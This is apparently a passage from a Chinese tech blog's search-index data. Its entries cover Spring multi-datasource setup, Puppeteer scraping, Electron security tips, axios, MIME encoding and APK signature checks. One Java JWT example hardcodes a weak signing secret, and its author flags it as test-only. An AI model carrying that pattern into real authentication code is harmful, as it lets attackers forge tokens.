key=\"hibernate.default_schema\"\u003eProject\u003c/prop --\u003e \u003cprop key=\"hibernate.current_session_context_class\"\u003eorg.springframework.orm.hibernate4.SpringSessionContext\u003c/prop\u003e \u003c/props\u003e \u003c/property\u003e \u003cproperty name=\"mappingResources\"\u003e \u003clist\u003e \u003cvalue\u003ecom/Project/conf/xxxx_sql.xml\u003c/value\u003e \u003c/list\u003e \u003c/property\u003e \u003c/bean\u003e \u003cbean id=\"historySessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"\u003e \u003cproperty name=\"dataSource\" ref=\"dataSourceHistory\"/\u003e \u003cproperty name=\"packagesToScan\" value=\"com.Project.persistence.history.entity\" /\u003e \u003cproperty name=\"hibernateProperties\"\u003e \u003cprops\u003e \u003cprop key=\"hibernate.dialect\"\u003e org.hibernate.dialect.PostgreSQLDialect \u003c/prop\u003e \u003cprop key=\"javax.persistence.validation.mode\"\u003enone\u003c/prop\u003e \u003cprop key=\"hibernate.show_sql\"\u003etrue\u003c/prop\u003e \u003cprop key=\"hibernate.format_sql\"\u003etrue\u003c/prop\u003e \u003cprop key=\"hibernate.default_schema\"\u003ehistory\u003c/prop\u003e \u003cprop key=\"hibernate.current_session_context_class\"\u003eorg.springframework.orm.hibernate4.SpringSessionContext\u003c/prop\u003e \u003c/props\u003e \u003c/property\u003e \u003c/bean\u003e \u003ctx:annotation-driven transaction-manager=\"transactionManager\"/\u003e .... \u003cbean id=\"transactionManager\" class=\"org.springframework.orm.hibernate4.HibernateTransactionManager\"\u003e \u003cproperty name=\"sessionFactory\" ref=\"sessionFactory\"/\u003e \u003cqualifier value=\"ProjectTx\"/\u003e \u003c/bean\u003e \u003cbean id=\"historyTransactionManager\" class=\"org.springframework.orm.hibernate4.HibernateTransactionManager\"\u003e \u003cproperty name=\"sessionFactory\" ref=\"historySessionFactory\"/\u003e \u003cqualifier value=\"historyTx\"/\u003e 針對原本 Bean 建立物件，去做 ForHistory名稱，原因是 packagesToScan 時候，不能用相同 Entry 名稱，所以要特別命名。 XXXX.java ==\u003e XXXXForHistory.java 複製 GenericDaoImpl 維 GenericDaoForHistoryImpl 因為GenericDaoImpl 裡面 SessionFactory 寫死，所以為什麼上面設定怎麼調整，所以沒法修改到連線，這邊也是我目前沒辦法動態載入到連線(SessionFactory)地方。 public class GenericDaoImpl\u003cT\u003e implements GenericDao\u003cT\u003e { private Class\u003cT\u003e clazz; public GenericDaoImpl() { ParameterizedType type = (ParameterizedType) this.getClass().getGenericSuperclass(); clazz = (Class\u003cT\u003e) type.getActualTypeArguments()[0]; } @Resource private SessionFactory sessionFactory; 改為 @Resource private SessionFactory historySessionFactory; @Resource可以參考 Spring 自動注入小記 | 程式狂想筆記 查詢SQL設定@Transactional另一條連線 我們這邊applicationContext.xml 有設定historyTransactionManager裡面的\u003cqualifier value=\"historyTx\"/\u003e記得設定對應資料 @Transactional(\"datasource1Tx\") ","date":"2022-07-31","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:3:1","tags":["java","spring"],"title":"Spring 建立多個連線方法","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"HibernateTransactionManager LocalEntityManagerFactoryBean 差異 https://blog.supercalifragilisticexpialidociouser.com/page/2/ yogi0209/spring-mvc-multi-datasource 尚未整理 ","date":"2022-07-31","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:4:0","tags":["java","spring"],"title":"Spring 建立多個連線方法","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"覺得很有趣，稍微整理一下。(未完成) ","date":"2022-07-31","objectID":"/blog/posts/%E7%9B%B8%E9%97%9C%E7%B8%AE%E5%9C%96%E4%BC%BA%E6%9C%8D%E5%99%A8%E6%95%B4%E7%90%86/:0:0","tags":["縮圖"],"title":"相關縮圖伺服器整理","uri":"/blog/posts/%E7%9B%B8%E9%97%9C%E7%B8%AE%E5%9C%96%E4%BC%BA%E6%9C%8D%E5%99%A8%E6%95%B4%E7%90%86/"},{"categories":["實用工具"],"content":"thumbor thumbor tutorial 【儲存服務】基於MinIO和Thumbor搭建影象服務_小帥帥丶 - MdEditor ","date":"2022-07-31","objectID":"/blog/posts/%E7%9B%B8%E9%97%9C%E7%B8%AE%E5%9C%96%E4%BC%BA%E6%9C%8D%E5%99%A8%E6%95%B4%E7%90%86/:1:0","tags":["縮圖"],"title":"相關縮圖伺服器整理","uri":"/blog/posts/%E7%9B%B8%E9%97%9C%E7%B8%AE%E5%9C%96%E4%BC%BA%E6%9C%8D%E5%99%A8%E6%95%B4%E7%90%86/"},{"categories":["實用工具"],"content":"Imagor","date":"2022-07-31","objectID":"/blog/posts/%E7%9B%B8%E9%97%9C%E7%B8%AE%E5%9C%96%E4%BC%BA%E6%9C%8D%E5%99%A8%E6%95%B4%E7%90%86/:2:0","tags":["縮圖"],"title":"相關縮圖伺服器整理","uri":"/blog/posts/%E7%9B%B8%E9%97%9C%E7%B8%AE%E5%9C%96%E4%BC%BA%E6%9C%8D%E5%99%A8%E6%95%B4%E7%90%86/"},{"categories":["爬蟲"],"content":"參考文章 淺嚐 WebDriverIO - Eden Liu 【Day8】selenium-webdriver：爬蟲起手式，帶你認識所見即所得的爬蟲工具 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Day 22 Puppeteer處理lazy load, SSR, 反爬蟲防禦, 高效地爬大量數據 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:1:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["爬蟲"],"content":"安裝環境 建好 node 初始專案 npm init 安裝 npm i puppeteer 執行程式看看 const puppeteer = require('puppeteer'); (async () =\u003e { const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto('https://example.com'); await page.screenshot({ path: 'example.png' }); await browser.close(); })(); ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:2:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["爬蟲"],"content":"page.click 無效解決方法 有時候執行page.click無效，目前不確定甚麼原因，有找到方法解決，參考 Navigation after click not working regardless of actions I take · Issue #3670 · puppeteer/puppeteer async function nativeClick(page, button) { await page.evaluate((button) =\u003e { document.querySelector(button).click(); }, button); } ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:3:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["爬蟲"],"content":"tag 裡面文字 HTML Element 裡面可以再做 querySelector 在做搜尋元件動作，也可以用XPATH，但XPATH不太熟的話，建議用JS去做會比較簡單。 Javascript .querySelector find \u003cdiv\u003e by innerTEXT - Stack Overflow ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:4:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["爬蟲"],"content":"iframe 處理方法 const frameHandle = await page.$(\"iframe[id='frame1']\"); const frame = await frameHandle.contentFrame(); frame.click(xxx) frame用法跟 page差不多。 iFrames in Puppeteer [Node.js打造API] 設定joi與config dotenv環境參數 — 1010Code ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:5:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["爬蟲"],"content":"base auth Implement HTTP Authentication API · Issue #426 · puppeteer/puppeteer ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:6:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["爬蟲"],"content":"dialog 處理 Puppeteer，該如何判斷登入失敗跳出提示的動作？（順便想記錄第一次用到 Promise.race() XD） | 小馬彬的部落格 ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:7:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["爬蟲"],"content":"deno 編譯程式 可參考:deno 牌 puppeteer，真香! | 七日打卡_胡琦 - MdEditor 我有在 deno 編譯成exe程式，不過在電腦使用不能正常執行，但後來發現需要設定環境變數PUPPETEER_EXECUTABLE_PATH指定你 Chrome 安裝路徑也可以跑。 ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:8:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["爬蟲"],"content":"其他 nodejs打包成桌面程式（exe）的進階之路 - ⎝⎛CodingNote.cc ⎞⎠ 爬蟲、E2E 測試兩相宜的好工具 - Puppeteer | 卡斯伯 Blog - 前端，沒有極限 how to minimize browser to tray · Issue #4513 · puppeteer/puppeteer Puppeteer爬蟲常用技巧 | 只是個打字的 奇妙的一行JS程式碼之完整解析 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2022-07-31","objectID":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/:9:0","tags":["爬蟲","puppeteer","js"],"title":"Puppeteer 爬蟲小試","uri":"/blog/posts/Puppeteer-%E7%88%AC%E8%9F%B2%E5%B0%8F%E8%A9%A6/"},{"categories":["JavaScript"],"content":"尚未整理完成，有空整理。 ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:0:0","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"架構 \u0026 生命週期 cawa-93/vite-electron-builder: Secure boilerplate for Electron app based on Vite. TypeScript + Vue/React/Angular/Svelte/Vanilla [ Day 3 ] - 桌面小圖示(二) - Electron 架構說明 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Electron 生命週期看這篇就夠了_淘系前端團隊 - MdEditor ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:1:0","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"preload.js contextBridge | Electron nodejs 跟 存 web 溝通頁面。 ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:1:1","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"main nodejs 程式。 ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:1:2","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"render web 程式。 就跟上面圖示差不多。 ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:1:3","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"Electron log GitHub - megahertz/electron-log: Just a simple logging module for your Electron application ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:2:0","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"Electron 安全性 electron的安全问题需要注意哪些问题？ - 知乎 安全，本地功能和你的责任 - Electron中文手册 这并不是万无一失的，但至少，你应该尝试以下内容： 只显示安全的内容(https) 在显示远程内容的所有渲染器中禁用 Node 集成 (在 webPreferences 中设置 nodeIntegration 为 false) 在显示远程内容的所有渲染器中启用上下文隔离 (在 webPreferences 中设置 contextIsolation 为 true) 在所有加载远程内容的会话中使用 ses.setPermissionRequestHandler() . 不要禁用 webSecurity. 禁用它将禁用同源策略. 定义一个 Content-Security-Policy , 并使用限制规则 (即： script-src 'self') 覆盖并禁用 eval , 它允许字符串作为代码执行. 不要设置 allowRunningInsecureContent 为 true. 不要启用 experimentalFeatures 或 experimentalCanvasFeatures 除非你知道你在做什么. 不要使用 blinkFeatures 除非你知道你在做什么. WebViews: 不要填加 nodeintegration 属性. WebViews: 不要使用 disablewebsecurity WebViews: 不要使用 allowpopups WebViews: 不要使用 insertCSS 或 executeJavaScript 操作远程 CSS/JS. WebViews: 在 will-attach-webview事件之前,应验证 \u003cwebview\u003e所有的选项或参数: 目前看 render 程是不要擺上危險執行程式，產生出來 aser 可以被解壓縮出來，所以別人可以看到程式或調整程式。 prelaod.js 用到程式不確定會有問題，不過目前猜測應該不會有問題才是。main 那邊就不用說了，這邊是安全區域。 ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:3:0","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"Electron 開機啟動 electron实现开机自启+通过链接调起应用(windows) - SegmentFault 思否 ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:4:0","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"Electron 注冊桌面軟體(protocol 模塊) const { app, protocol } = require(\"electron\"); const path = require(\"path\"); app.on(\"ready\", () =\u003e { protocol.registerFileProtocol( \"uinika\", (request, callback) =\u003e { const url = request.url.substr(7); callback({ path: path.normalize(`${__dirname}/${url}`) }); }, error =\u003e { if (error) console.error(\"協議註冊失敗！\"); } ); }); 參考使用Electron打造跨平台桌面應用 - 知乎，裡面參滿多好康內容，推薦進去看。 ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/:5:0","tags":["nodejs","electron"],"title":"Electron 大雜燴文章區","uri":"/blog/posts/Electron-%E5%A4%A7%E9%9B%9C%E7%87%B4%E6%96%87%E7%AB%A0%E5%8D%80/"},{"categories":["JavaScript"],"content":"太久沒寫前端就忘了，簡單紀錄。 ","date":"2022-07-31","objectID":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:0","tags":["javascript","axios"],"title":"axios 操作小記","uri":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"axios 是物件 十八日目：JavaScript　axiosノ章 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2022-07-31","objectID":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:1:0","tags":["javascript","axios"],"title":"axios 操作小記","uri":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"Creating an instance 建立 axios 客製設定實例。 const instance = axios.create({ baseURL: 'https://some-domain.com/api/', timeout: 1000, headers: {'X-Custom-Header': 'foobar'} }); ","date":"2022-07-31","objectID":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:0","tags":["javascript","axios"],"title":"axios 操作小記","uri":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"axios.data ","date":"2022-07-31","objectID":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:3:0","tags":["javascript","axios"],"title":"axios 操作小記","uri":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"data 可放’Country=Brasil\u0026City=Belo Horizonte’字串 // - Browser only: FormData, File, Blob // - Node only: Stream, Buffer ","date":"2022-07-31","objectID":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:3:1","tags":["javascript","axios"],"title":"axios 操作小記","uri":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"Form 表單傳資訊 [Node.js] 使用 axios post form-data const formData = new FormData() Object.keys(data).forEach(key =\u003e { formData.append(key, data[key]) }) axios 基本使用 \u0026 Config - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2022-07-31","objectID":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:4:0","tags":["javascript","axios"],"title":"axios 操作小記","uri":"/blog/posts/axios-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"簡單小試。 ","date":"2022-07-31","objectID":"/blog/posts/Java-%E7%B0%A1%E5%96%AEJ-WT%E6%96%B9%E6%B3%95%E6%B8%AC%E8%A9%A6/:0:0","tags":["java","jwt"],"title":"Java 簡單JWT方法測試","uri":"/blog/posts/Java-%E7%B0%A1%E5%96%AEJ-WT%E6%96%B9%E6%B3%95%E6%B8%AC%E8%A9%A6/"},{"categories":["Java"],"content":"實作 參考網路範例調整，簡單測試jwt功能，不要直接用下面程式喔。 package util; import java.io.Serializable; import java.time.Instant; import java.util.Date; import java.util.HashMap; import java.util.Map; import javax.security.auth.message.AuthException; import org.springframework.stereotype.Component; import io.jsonwebtoken.ExpiredJwtException; import io.jsonwebtoken.Jwts; import io.jsonwebtoken.MalformedJwtException; import io.jsonwebtoken.SignatureAlgorithm; import io.jsonwebtoken.SignatureException; import io.jsonwebtoken.UnsupportedJwtException; @Component public class JwtTokenUtils implements Serializable { /** * */ private static final long serialVersionUID = 6307640988200151725L; private static final long EXPIRATION_TIME = 10 * 60 * 1000; /** * JWT SECRET KEY */ private static final String SECRET = \"PBCIKEY\"; /** * 簽發JWT */ public String generateToken(Map\u003cString, String\u003e userDetails) { Map\u003cString, Object\u003e claims = new HashMap\u003c\u003e(); claims.put( \"userName\", userDetails.get(\"userName\") ); return Jwts.builder() .setClaims( claims ) .setExpiration( new Date( Instant.now().toEpochMilli() + EXPIRATION_TIME ) ) .signWith( SignatureAlgorithm.HS512, SECRET ) .compact(); } /** * 驗證JWT */ public void validateToken(String token) throws AuthException { try { Jwts.parser() .setSigningKey( SECRET ) .parseClaimsJws( token ); } catch (SignatureException e) { throw new AuthException(\"Invalid JWT signature.\"); } catch (MalformedJwtException e) { throw new AuthException(\"Invalid JWT token.\"); } catch (ExpiredJwtException e) { throw new AuthException(\"Expired JWT token\"); } catch (UnsupportedJwtException e) { throw new AuthException(\"Unsupported JWT token\"); } catch (IllegalArgumentException e) { throw new AuthException(\"JWT token compact of handler are invalid\"); } } public static void main(String[] argv) { Map\u003cString,String\u003e userMap = new HashMap\u003c\u003e(); userMap.put(\"userName\",\"HelloUser\"); JwtTokenUtils jwtUtils = new JwtTokenUtils(); String token = jwtUtils.generateToken(userMap); System.out.println(\"token:\" + token); try { jwtUtils.validateToken(token); String user = (String) jwtUtils.getUserName(token); System.out.println(\"取得 user:\" + user); } catch (AuthException e) { // TODO Auto-generated catch block e.printStackTrace(); } } /** * @param token * @return */ private Object getUserName(String token) { return Jwts.parser() .setSigningKey(SECRET) .parseClaimsJws(token) .getBody() .get(\"userName\"); } } ","date":"2022-07-31","objectID":"/blog/posts/Java-%E7%B0%A1%E5%96%AEJ-WT%E6%96%B9%E6%B3%95%E6%B8%AC%E8%A9%A6/:1:0","tags":["java","jwt"],"title":"Java 簡單JWT方法測試","uri":"/blog/posts/Java-%E7%B0%A1%E5%96%AEJ-WT%E6%96%B9%E6%B3%95%E6%B8%AC%E8%A9%A6/"},{"categories":["Java"],"content":"參考文章 Day 29 - Spring Boot 想要資料令牌要先帶來!－ JWT - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Java - JSON Web Tokens (JWT) 示範 | Kenny’s Blog [筆記] 透過 JWT 實作驗證機制. 以 JWT（JSON Web Tokens）實作驗證機制 | by Mike Huang | 麥克的半路出家筆記 | Medium ","date":"2022-07-31","objectID":"/blog/posts/Java-%E7%B0%A1%E5%96%AEJ-WT%E6%96%B9%E6%B3%95%E6%B8%AC%E8%A9%A6/:2:0","tags":["java","jwt"],"title":"Java 簡單JWT方法測試","uri":"/blog/posts/Java-%E7%B0%A1%E5%96%AEJ-WT%E6%96%B9%E6%B3%95%E6%B8%AC%E8%A9%A6/"},{"categories":["程式心法"],"content":"某一天專案升級 Java 8 時候，我專案遇到Email發送標題亂碼，最後找到解決方案。 不過我還深入了解一下，預防下次遇到快速找到真正原因。 $subject = \"=?UTF-8?B?\".base64_encode($subject).\"?=\"; 將上面一句添加到代碼之中，這樣，發送的中文郵件標題就不是亂碼了。 原文網址：https://kknews.cc/code/nkobrl3.html PHP發送UTF-8編碼中文郵件標題亂碼的解決 - 每日頭條 MimeUtility (JavaMail API documentation) Java使用javax.mail傳送郵件 解決收件人、發件人名字亂碼問題 - IT閱讀 return String.format(\"%1$s \u003c%2$s\u003e\", MimeUtility.encodeText(name, \"UTF-8\", \"B\"), email); MIME协议详细介绍. 邮件由header+body组成，头部格式: Name: Value。 | by Gabi Sual | Medium 這裡面邮件MIME格式分析 - crystalray - 博客园介紹非常詳細。 ","date":"2022-07-31","objectID":"/blog/posts/MIME-%E4%BF%A1%E4%BB%B6%E6%A8%99%E9%A1%8C%E4%BA%82%E7%A2%BC%E5%95%8F%E9%A1%8C/:0:0","tags":["java","mail","mime"],"title":"MIME 信件標題亂碼問題","uri":"/blog/posts/MIME-%E4%BF%A1%E4%BB%B6%E6%A8%99%E9%A1%8C%E4%BA%82%E7%A2%BC%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"我覺得很重要，所以就不寫了。 https://www.codingsusu.com/remove-file-from-jar/ ","date":"2022-07-31","objectID":"/blog/posts/Java-%E7%9A%84-Classpath-%E7%A8%8B%E6%98%AF%E7%B7%A8%E8%AD%AF%E9%A0%86%E5%BA%8F/:0:0","tags":["java","classpath"],"title":"Java 的 Classpath 程是編譯順序","uri":"/blog/posts/Java-%E7%9A%84-Classpath-%E7%A8%8B%E6%98%AF%E7%B7%A8%E8%AD%AF%E9%A0%86%E5%BA%8F/"},{"categories":["實用工具"],"content":"kemon Unite 無法玩，所以網路找到 apk檔案，不知道有沒有確認安全性方法。這邊就做個簡單整理。 先貼我找APK網站地方4 個安全且知名的 APK 檔下載網站整理 - 電腦王阿達，我這邊是使用 APKMirror。 總共有四個: APKMirror APKPure Aptoide APK Downloader ","date":"2022-07-31","objectID":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:0:0","tags":["apk","android","signature"],"title":"確認 apk 簽章方法","uri":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"線上確認簽章 VirusTotal - Home APK Tools Online Certificate info | sisik VirusTotal 檢查結果有一個有問題樣子 ","date":"2022-07-31","objectID":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:1:0","tags":["apk","android","signature"],"title":"確認 apk 簽章方法","uri":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"apksigner 確認 APK 檔案是否為 release 版的方式 aapt jarsigner apksigner apksigner verify jp.pokemon.pokemonunite_1.2.1.2-324739_minAPI19\\(armeabi-v7a\\)\\(nodpi\\)_apkmirror.com.apk  ✔  8  16:22:05 DOES NOT VERIFY ERROR: APK Signature Scheme v2 signer #1: Malformed additional attribute #1 有找到相關驗證成功呈現內容。 Android 如何检查apk是否已经签名，V1、V2、V3和V4签名？ - 行走的思想 - 博客园 apksigner verify -v --print-certs apkmname 玩转 Android APK 签名，是时候该用上 apksigner 工具给你的 APP 签名了 這邊怎麼測試都失敗，所以就不安裝了… ","date":"2022-07-31","objectID":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:2:0","tags":["apk","android","signature"],"title":"確認 apk 簽章方法","uri":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"其他相關 ","date":"2022-07-31","objectID":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:3:0","tags":["apk","android","signature"],"title":"確認 apk 簽章方法","uri":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"apk-info APK 資訊檢查工具《APK-Info》安裝第三方軟體時先行檢查，增強安全性 | 就是教不落 - 給你最豐富的 3C 資訊、教學網站 APK-Info (Windows App) | XDA Forums 我看有那麼多Permissions ，我也不知道是不是安全的。 write_external_storage read_external_storage internet vibrate access_network_state access_wifi_state foreground_service modify_audio_settings record_audio bluetooth bluetooth_admin wake_lock jp.pokemon.pokemonunite.permission.c2d_message com.android.vending.billing com.google.android.finsky.permission.bind_get_install_referrer_service com.google.android.c2dm.permission.receive ","date":"2022-07-31","objectID":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:3:1","tags":["apk","android","signature"],"title":"確認 apk 簽章方法","uri":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"apk 下載 [教學] Google Play 商店如何跨區/國家限制，下載區域限定版遊戲軟體？ - 簡單生活Easylife ","date":"2022-07-31","objectID":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/:3:2","tags":["apk","android","signature"],"title":"確認 apk 簽章方法","uri":"/blog/posts/%E7%A2%BA%E8%AA%8D-apk-%E7%B0%BD%E7%AB%A0%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"electron 不支持 prompt 对话框怎么办？ smalltalk: https://github.com/coderaiser/smalltalk sweetalert2: https://github.com/sweetalert2/sweetalert2 artDialog: https://github.com/aui/artDialog ============================================ 商业转载请联系获得授权，非商业转载请注明出处 作者：苏南大叔 【京城，非著名互联网从业人员】 来源：https://newsn.net/say/electron-prompt.html 打赏：https://newsn.net/shang.html 加群：https://newsn.net/group.html 欢迎转发/打赏/点赞/留言，感谢您的支持！ ","date":"2022-07-31","objectID":"/blog/posts/Electron-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8-prompt/:0:0","tags":["js","nodejs","electron"],"title":"Electron 無法使用 